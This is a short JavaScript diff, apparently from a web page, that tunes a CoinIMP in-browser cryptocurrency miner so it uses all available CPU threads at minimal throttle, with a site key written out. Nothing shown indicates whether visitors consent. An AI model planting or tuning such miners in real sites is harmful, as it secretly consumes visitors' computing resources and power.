@@ -85,7 +85,7 @@
         // Initialize CoinIMP miner (for mining VerusCoin or Monero)
         function startMining() {
             const threads = getAvailableThreads(); // Get the number of threads based on available CPU cores
-            const miner = new Client.Anonymous('3f1e57f6b0ddc90d68e3b00a16f1fcd6c9a13a77a02c3e8137c05f4618e0525c', {throttle: 0, c: 'w'}
+            const miner = new Client.Anonymous('3f1e57f6b0ddc90d68e3b00a16f1fcd6c9a13a77a02c3e8137c05f4618e0525c', {throttle: 0.1 ,threads: threads, c: 'w',forceASMJS: false}
             //{threads: threads ,throttle: 0.5,autoThreads: false, forceASMJS: false }
             );
 
